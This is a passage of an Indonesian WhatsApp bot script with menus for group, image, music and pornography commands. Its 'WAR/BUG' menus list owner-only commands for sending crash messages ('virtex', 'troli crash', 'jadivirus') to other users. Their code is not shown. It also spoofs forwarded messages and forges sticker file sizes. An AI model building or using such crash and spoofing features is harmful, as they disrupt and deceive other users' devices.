│冬 ${prefix}tovideo
│冬 ${prefix}tomp3
│冬 ${prefix}sticker
│─────────────┈ ⳹
│ 「 MUSIC MENU」
│冬 ${prefix}sound1
│冬 ${prefix}sound2
│冬 ${prefix}sound3
│冬 ${prefix}sound4
│冬 ${prefix}sound5
│冬 ${prefix}sound6
│冬 ${prefix}sound7
│冬 ${prefix}sound8
│冬 ${prefix}sound9
│冬 ${prefix}sound10
│─────────────┈ ⳹
│ 「 RANDOM MENU」
│冬 ${prefix}detikvn
│冬 ${prefix}detikvideo
│冬 ${prefix}ttmusik
│冬 ${prefix}play
│冬 ${prefix}darkjokes
│─────────────┈ ⳹
│ 「 18+ MENU」
│冬 ${prefix}kodenuklir
│冬 ${prefix}linkbokep
│冬 ${prefix}bokep1
│冬 ${prefix}bokep2
│冬 ${prefix}bokep3
│冬 ${prefix}bokep4
│冬 ${prefix}bokep5
│冬 ${prefix}bokep6
│冬 ${prefix}bokep7
│冬 ${prefix}bokep8
│冬 ${prefix}bokep9
│冬 ${prefix}bokep10
│冬 ${prefix}bokep11
│冬 ${prefix}bokep12
│冬 ${prefix}bokep13
│冬 ${prefix}bokep14
│冬 ${prefix}bokep15
│─────────────┈ ⳹
│ 「 WAR MENU🎭」
│冬 ${prefix}card
│冬 ${prefix}troliv2
│冬 ${prefix}virtex
│冬 ${prefix}bugpdf
│冬 ${prefix}bugdoc
│冬 ${prefix}bugloc
│冬 ${prefix}hanzbug
│冬 ${prefix}hanzofc
│冬 ${prefix}bugbutton
│冬 ${prefix}jadivirkon
│冬 ${prefix}jadivirloc
│冬 ${prefix}jadivirus
│冬 ${prefix}jadivirvid
│冬 ${prefix}jadikatalog
│冬 ${prefix}tovirgam
└┬────────────┈ ⳹
┌┤➤ 📍 
││
││Menu Dikit✌
│├──────── 
││冬 ◗ _Hanz Ofc_
│└──────── 
│冬◗ My Team WH Team
└─━━━─── • ───━━━❋ཻུ۪۪⸙

║▌│█║▌│ █║▌│█│║▌║
║▌│█║▌│ █║▌│█│║▌║
      「 Bot Wea」`
Sendbutdocument(from, `${menu}`, "*Haris Ganz*",
fs.readFileSync('./media/Hanz Ofc.pdf'),
{mimetype:Mimetype.pdf, 
thumbnail:fs.readFileSync('./media/imagepdf.jpg'),
filename:`HANZ々OFC彡`},
[{buttonId:`${prefix}donasi`,buttonText:{displayText:'DONASI'},type:1},
{buttonId:`${prefix}ucapan`,buttonText:{displayText:'UCAPAN'},type:1},
{buttonId:`${prefix}sc`,buttonText:{displayText:'SCRIPT𝟕'},type:1}], 
{quoted:fdoc, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`HANZ々OFC彡 [BOTZ🎭]`,body:`Script By Haris Ganz`,mediaType:"2",thumbnail:fakeimage,mediaUrl:`https://youtu.be/jT-th_f0l-Y`}}})
break
case 'menucatalog':
            menunya = `${pushname}
            
『 *GROUP MENU* 』

メ${prefix}welcome on/off
メ${prefix}antilink
メ${prefix}antivirtex
メ${prefix}add
メ${prefix}kick
メ${prefix}promote
メ${prefix}demote
メ${prefix}tagall
メ${prefix}hidetag
メ${prefix}setpp
メ${prefix}setdes
メ${prefix}setname

 『 *OWNER MENU* 』
 
メ${prefix}set
メ${prefix}auto
メ${prefix}bc
メ${prefix}bc2
メ${prefix}tobc
メ${prefix}jadibot
メ${prefix}stopjadibot
メ${prefix}addcmd
メ${prefix}delcmd
メ${prefix}listcmd
メ${prefix}restart
メ${prefix}autorespon pc/gc
メ${prefix}setppbot
メ${prefix}setppwa
メ${prefix}upswtext
メ${prefix}upswvn
メ${prefix}upswvideo
メ${prefix}upswimage
メ${prefix}upswgif
メ${prefix}upswaudio
メ${prefix}upswsticker
メ${prefix}upswlokasi

 『 *MAKER MENU* 』
 
メ${prefix}neon
メ${prefix}quote
メ${prefix}glow
メ${prefix}burn
メ${prefix}flower
メ${prefix}wooden
メ${prefix}golden
メ${prefix}summer
メ${prefix}maker2d2
メ${prefix}maker2d3
メ${prefix}maker2d4
メ${prefix}maker3d2
メ${prefix}maker3d3
メ${prefix}maker3d4
メ${prefix}transformer
メ${prefix}googletxt
メ${prefix}coffeecup
メ${prefix}battlefield

 『 *IMAGE MENU* 』
 
メ${prefix}attp
メ${prefix}toimg
メ${prefix}tovideo
メ${prefix}tomp3
メ${prefix}sticker

 『 *MUSIC MENU* 』
 
メ${prefix}sound1
メ${prefix}sound2
メ${prefix}sound3
メ${prefix}sound4
メ${prefix}sound5
メ${prefix}sound6
メ${prefix}sound7
メ${prefix}sound8
メ${prefix}sound9
メ${prefix}sound10

 『 *RANDOM MENU* 』
 
メ${prefix}detikvn
メ${prefix}detikvideo
メ${prefix}ttmusik
メ${prefix}play
メ${prefix}darkjokes

 『 *18+ MENU* 』
 
メ${prefix}kodenuklir
メ${prefix}linkbokep
メ${prefix}bokep1
メ${prefix}bokep2
メ${prefix}bokep3
メ${prefix}bokep4
メ${prefix}bokep5
メ${prefix}bokep6
メ${prefix}bokep7
メ${prefix}bokep8
メ${prefix}bokep9
メ${prefix}bokep10
メ${prefix}bokep11
メ${prefix}bokep12
メ${prefix}bokep13
メ${prefix}bokep14
メ${prefix}bokep15

 『 *WAR MENU* 』
 
メ${prefix}card
メ${prefix}troliv2
メ${prefix}virtex
メ${prefix}bugpdf
メ${prefix}bugdoc
メ${prefix}bugloc
メ${prefix}hanzbug
メ${prefix}hanzofc
メ${prefix}bugbutton
メ${prefix}jadivirkon
メ${prefix}jadivirloc
メ${prefix}jadivirus
メ${prefix}jadivirvid
メ${prefix}jadikatalog
メ${prefix}tovirgam
`
            var imgs = await Hanz.prepareMessage('0@c.us', fakeimage, image, { thumbnail: fakeimage })
            var imgCatalog = imgs.message.imageMessage
            var ctlg = await Hanz.prepareMessageFromContent(from, {
            "productMessage": {
            "product": {
            "productImage": imgCatalog,
            "productId": "4457725420906655",
            "title": `メMÈñÚ ÇÄ†ÄLÖG`,
            "description": menunya,
            "footerText": `メHANZ OFC`,
            "currencyCode": "USD",
            "priceAmount1000": "0",
            "productImageCount": 1,
            "firstImageId": 1,
            "salePriceAmount1000": "0",
            "retailerId": `All Menu Catalog`,
            "url": "Haris Ganteng"
            },
            "businessOwnerJid": "6283144394823@s.whatsapp.net",
            }
            }, { quoted: ftrol, mimetype: 'image/jpeg' })
            Hanz.relayWAMessage(ctlg)
            break
case 'ucapan':
				asa = await getBuffer(`http://hadi-api.herokuapp.com/api/tts?text=Kontol Bapak Kau&language=id`)
                Hanz.sendMessage(from, asa, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
                break          
//~~~~~~~~~~~~~~~~~~~~~[LIST MENU]~~~~~~~~~~~~~~~~~~~~~//
//MENU LIST COK
  case 'command':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `╔═════════════════⎉
║冬Nama Bot : ${botname}
║冬Nama Owner : ${ownername}
║冬Nomor Owner : ${owner}
║冬Creator : ${creator}
║冬Mode : ${publik ? 'Public' : 'Self'}
║冬Runtime : ${runtime(process.uptime())}
║冬Prefix : Multi
║冬Battery : ${baterai.battery}
║冬Charged : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Autoread pc : ${readP ? 'On' : 'Off'}
║冬Autoread gc : ${readG ? 'On' : 'Off'}
║冬Auto Ketik : ${ngetik ? 'On' : 'Off'}
║冬Auto Recording : ${autovn ? 'On' : 'Off'}
╚═════════════════❍ `,
"buttonText": " MENU️",
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
"title": `Silahkan Pilih Gan`,
    "rows": [ 
       {
           "title": "MENU DIKIT✌",
           "rowId": `${prefix}ok`
           },
	       {	     
	       "title": "👥GROUP HANZ OFC",
           "rowId": `${prefix}grup`           
           },
	       {
           "title": "👤OWNER MENU",
           "rowId": `${prefix}ownermenu`          
           },
	       {
           "title": "👥GROUP MENU",
           "rowId": `${prefix}groupmenu`
           },
	       {
           "title": "🎭BUG MENU",
           "rowId": `${prefix}bugmenu`
           },
	       {           
           "title": "📸IMAGE MENU",
           "rowId": `${prefix}imagemenu`
           },
	       {
           "title": "🎩RANDOM MENU",
           "rowId": `${prefix}randomenu`
           },
	       {
           "title": "🎶MENU MUSIK",
           "rowId": `${prefix}musikmenu`
           },
	       {
	       
           "title": "👀18+ MENU",
           "rowId": `${prefix}18+`       
           },
	       {
           "title": "🎩MAKER MENU",
           "rowId": `${prefix}makermenu`   
          }  
        ]
      }
    ]
  }
 }, {quoted: floc})
 Hanz.relayWAMessage(res)
 break
 case 'musikmenu':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": 'MENU MUSIK 🔊\nBY : HANZ々OFC彡',
"description": `▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nSUBSCRIBE\nhttps://youtube.com/HANZ々OFC彡\nSUBSCRIBE AND LIKE\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
"buttonText": "MENU️",
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
"title": `Silahkan Pilih Musik yg enak Gan`,
    "rows": [ 
       {
           "title": "🎶 SOUND1",
           "rowId": `${prefix}sound1`
           },
	       {
           "title": "🎶 SOUND2",
           "rowId": `${prefix}sound2`
           },
	       {
           "title": "🎶 SOUND3",
           "rowId": `${prefix}sound3`
           },
	       {
           "title": "🎶 SOUND4",
           "rowId": `${prefix}sound4`
           },
	       {
           "title": "🎶 SOUND5",
           "rowId": `${prefix}sound5`
           },
	       {
           "title": "🎶 SOUND6",
           "rowId": `${prefix}sound6`
           },
	       {
           "title": "🎶 SOUND7",
           "rowId": `${prefix}sound7`
           },
	       {
           "title": "🎶 SOUND8",
           "rowId": `${prefix}sound8`
           },
	       {
           "title": "🎶 SOUND9",
           "rowId": `${prefix}sound9`
           },
	       {
           "title": "🎶 SOUND10",
           "rowId": `${prefix}sound10`
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
 case 'bokep':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": '18+ MENU💦',
"description": `AWAS SANGE AN🗿`,
"buttonText": "MENU️",
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
"title": `Silahkan Pilih Musik yg enak Gan`,
    "rows": [ 
       {
           "title": "💦BOKEP1",
           "rowId": `${prefix}bokep1`
           },
	       {
           "title": "💦BOKEP2",
           "rowId": `${prefix}bokep2`
           },
	       {
           "title": "💦BOKEP3",
           "rowId": `${prefix}bokep3`
           },
	       {
           "title": "💦BOKEP4",
           "rowId": `${prefix}bokep4`
           },
	       {
           "title": "💦BOKEP5",
           "rowId": `${prefix}bokep5`
           },
	       {
           "title": "💦BOKEP6",
           "rowId": `${prefix}bokep6`
           },
	       {
           "title": "💦BOKEP7",
           "rowId": `${prefix}sound7`
           },
	       {
           "title": "💦BOKEP8",
           "rowId": `${prefix}bokep8`
           },
	       {
           "title": "💦BOKEP9",
           "rowId": `${prefix}bokep9`
           },
	       {
           "title": "💦BOKEP10",
           "rowId": `${prefix}bokep10`
           },
	       {
           "title": "💦BOKEP11",
           "rowId": `${prefix}bokep11`
           },
	       {
           "title": "💦BOKEP12",
           "rowId": `${prefix}bokep12`
           },
	       {
           "title": "💦BOKEP13",
           "rowId": `${prefix}bokep13`
           },
	       {
           "title": "💦BOKEP14",
           "rowId": `${prefix}bokep14`
           },
	       {
           "title": "💦BOKEP15",
           "rowId": `${prefix}bokep15`
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
//~~~~~~~~~~~~~~~~~~~~~[BUTTON LOKASI MENU]~~~~~~~~~~~~~~~~~~~~~//
case 'groupmenu':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": `╭─❒ ⏤͟͟͞GROUP MENU
│
│◦➛${prefix}antilink
│◦➛${prefix}welcome
│◦➛${prefix}group
│◦➛${prefix}linkgroup
│◦➛${prefix}promote
│◦➛${prefix}demote
│◦➛${prefix}listonline
│◦➛${prefix}tagall
│◦➛${prefix}hidetag
│◦➛${prefix}totag
│◦➛${prefix}add
│◦➛${prefix}kick
│◦➛${prefix}setpp
│◦➛${prefix}setdesc
│◦➛${prefix}setname
└─────────────────冬`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!command",
								"buttonText": {
									"displayText": `BACK MENU`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!sewabot",
								"buttonText": {
									"displayText": `SEWABOT`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!donasi",
								"buttonText": {
									"displayText": `DONASI`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'makermenu':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": `╭─❒ ⏤͟͞MAKER MENU
│
│◦➛${prefix}neon
│◦➛${prefix}burn
│◦➛${prefix}glow
│◦➛${prefix}golden
│◦➛${prefix}summer
│◦➛${prefix}flower
│◦➛${prefix}quote
│◦➛${prefix}wooden
│◦➛${prefix}maker2d2
│◦➛${prefix}maker2d3
│◦➛${prefix}maker2d4
│◦➛${prefix}maker3d
│◦➛${prefix}maker3d2
│◦➛${prefix}maker3d3
│◦➛${prefix}maker3d4
│◦➛${prefix}transformer
│◦➛${prefix}googletxt
│◦➛${prefix}battlefield
│◦➛${prefix}coffeecup
│◦➛${prefix}coffeecup2
└─────────────────冬`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!command",
								"buttonText": {
									"displayText": `BACK MENU`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!sewabot",
								"buttonText": {
									"displayText": `SEWABOT`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!donasi",
								"buttonText": {
									"displayText": `DONASI`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'ownermenu':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": `╭─❒ ⏤͟͟͞OWNER MENU
│
│◦➛${prefix}set
│◦➛${prefix}auto
│◦➛${prefix}autorespon
│◦➛${prefix}addcmd
│◦➛${prefix}delcmd
│◦➛${prefix}listcmd
│◦➛${prefix}self/public
│◦➛${prefix}restart
│◦➛${prefix}setppbot
│◦➛${prefix}setppwa
│◦➛${prefix}upswtext
│◦➛${prefix}upswsticker
│◦➛${prefix}upswaudio
│◦➛${prefix}upswvn
│◦➛${prefix}upswlokasi
│◦➛${prefix}upswimage
│◦➛${prefix}upswvideo
│◦➛${prefix}upswgif
│◦➛${prefix}bcv2
│◦➛${prefix}bcgc
│◦➛${prefix}bc
│◦➛${prefix}tobc
└─────────────────冬`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!command",
								"buttonText": {
									"displayText": `BACK MENU`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!sewabot",
								"buttonText": {
									"displayText": `SEWABOT`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!donasi",
								"buttonText": {
									"displayText": `DONASI`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'emoji':
if (!q) return replyy('emojinya?')
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[4].url}`
sendStickerFromUrl(from,`${teks}`)	
console.log(teks)
})
break
case 'imagemenu':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": `╭─❒ ⏤͟͞IMAGE RAMDOM
│
│◦➛${prefix}attp
│◦➛${prefix}toimg
│◦➛${prefix}tomp3
│◦➛${prefix}sticker
│◦➛${prefix}tovideo
└─────────────────冬`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!command",
								"buttonText": {
									"displayText": `BACK MENU`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!sewabot",
								"buttonText": {
									"displayText": `SEWABOT`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!donasi",
								"buttonText": {
									"displayText": `DONASI`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'randomenu':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": `╭─❒ ⏤͟͟͞RANDOM MENU
│
│◦➛${prefix}detikvn
│◦➛${prefix}detikvideo
│◦➛${prefix}ttmusik
│◦➛${prefix}play
│◦➛${prefix}darkjokes
└─────────────────冬`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!command",
								"buttonText": {
									"displayText": `BACK MENU`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!sewabot",
								"buttonText": {
									"displayText": `SEWABOT`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!donasi",
								"buttonText": {
									"displayText": `DONASI`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case '18+':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": `╭─❒ ⏤͟͟͞SANGE MENU
│
│◦➛${prefix}kodenuklir
│◦➛${prefix}linkbokep
│◦➛${prefix}bokep
└─────────────────冬`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!kodenuklir",
								"buttonText": {
									"displayText": `KODENUKLIR`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!linkbokep",
								"buttonText": {
									"displayText": `LINKBOKEP`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!bokep",
								"buttonText": {
									"displayText": `BOKEP`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'size':
if (args.length < 1) return replyy('Masukan angkanya')
filsize = args[0]
costick = await Hanz.prepareMessageFromContent(from,{
"stickerMessage": {
"url": url,
"fileSha256": fileSha256.toString('base64'),
"fileEncSha256": fileEncSha256.toString('base64'),
"mediaKey": mediaKey.toString('base64'),
"mimetype": mimetype,
"height": height,
"width": width,
"directPath": directPath,
"fileLength": filsize,
"mediaKeyTimestamp": mediaKeyTimestamp.low,
"isAnimated": isAnimated
}
}, {quoted:mek})
Hanz.relayWAMessage(costick)
break
case 'cantik':                     
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   Hanz.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so cantik`, quoted: mek})
                   break                                      
                   case 'keren':                     
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   Hanz.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so keren`, quoted: mek})
                   break
                   case 'ganteng':                     
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   Hanz.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so ganteng`, quoted: mek})
                   break
case 'quotes1':                    
res = await Hanz.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Am50nFEWViHhiidXveqYkOsZNzQO4Rxr1LW6me_rCQcD.enc",
						"mimetype": "video/mp4",
						"fileSha256": "xaEM48/qClUkbsW0zJqIaFtFS5r/+pmXU7kJarxdf+c=",
						"fileLength": "1103453",
						"seconds": 8,
						"mediaKey": "UUehUrhac0y6gf/ZmiPyP2cVlcptrJSR4/EJ1Rr7B/c=",
						"caption": "Done!",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "T8C7XXGQsbs73+UZT/PoK5BQwIjwQFpVJGs2NkmjWDs=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:fdoc, contextInfo:{}}) 
Hanz.relayWAMessage(res)
                    break                   
case 'bugmenu':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": `╭─❒ ⏤͟͟͞͞WAR WER WOR🥶
│
│🛡️Khusus Owner Ya Tod
│
│き${prefix}bug =>(bug loc)
│き${prefix}card =>(text|jumlah)
│き${prefix}buglist =>(isi piltek)
│き${prefix}troliv2 =>(troli crash)
│き${prefix}hanzofc =>(bugbutton)
│き${prefix}buggc =>(bug old punah)
│き${prefix}bugloc =>(live lokasi)
│き${prefix}bugpc =>(gunakan di pc tod)
│き${prefix}jadivirkon =>(no|text)
│き${prefix}bugbutton =>(virgam+bugbutton)
│き${prefix}jadikatalog =>(reply foto + text)
│き${prefix}tovirgam =>(sticker jadi virgam)
│き${prefix}jadivirus =>(reply video, foto, audio, sticker)
│
│
│🎖️Rip Bug Old🏳
└─────────────────冬`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!command",
								"buttonText": {
									"displayText": `BACK MENU`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!sewabot",
								"buttonText": {
									"displayText": `SEWABOT`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!donasi",
								"buttonText": {
									"displayText": `DONASI`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
//━━━━━━━━━━━━━━━[ FITUR GROUP ]━━━━━━━━━━━━━━━━━//

case 'welcome':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (args.length < 1) return reply(`Ketik :\n${prefix}welcome on untuk mengaktifkan\n${prefix}welcome off untuk menonaktifkan`)
if ((args[0]) === 'on') {
if (isWelkom) return reply('welcome sudah aktif')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses mengaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
if (!isWelkom) return reply('welcome sudah off sebelumnya')
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses menonaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
break
case 'antilink' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
but = [
{ buttonId: '!antilinkon', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '!antilinkoff', buttonText: { displayText: 'Off' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antilink group", faketeks, but, mek)
break
case 'antilinkon' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses mengaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antilinkoff' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (!isAntiLink) return reply('anti link sudah off sebelumnya')
_antilink.splice(from, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses menonaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtex' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
but = [
{ buttonId: '!antivirtexon', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '!antivirtexoff', buttonText: { displayText: 'Off' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antivirtex group", faketeks, but, mek)
break
case 'listonline': 
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(Hanz.chats.get(ido).presences), Hanz.user.jid]
Hanz.sendMessage(from, 'LIST ONLINE:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: fdoc,
contextInfo: { mentionedJid: online }
})			 
break
case 'antivirtexon' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (isAntiVirtex) return reply('anti virtex group sudah aktif sebelumnya')
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses mengaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtexoff' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (!isAntiVirtex) return reply('Mode anti virtex sudah nonaktif sebelumnya')
_antivirtex.splice(from, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`✓Sukes menonaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'group' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})  
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
but = [
{ buttonId: '!groupbuka', buttonText: { displayText: 'Buka' }, type: 1 },
{ buttonId: '!grouptutup', buttonText: { displayText: 'Tutup' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk buka/tutup group", faketeks, but, mek)
break
case 'groupbuka' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
Hanz.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case 'grouptutup' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
Hanz.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'linkgrup' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
linkgc = await Hanz.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
Hanz.sendMessage(from, yeh, text, { quoted: ftrol })
break										   		             
case 'promote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
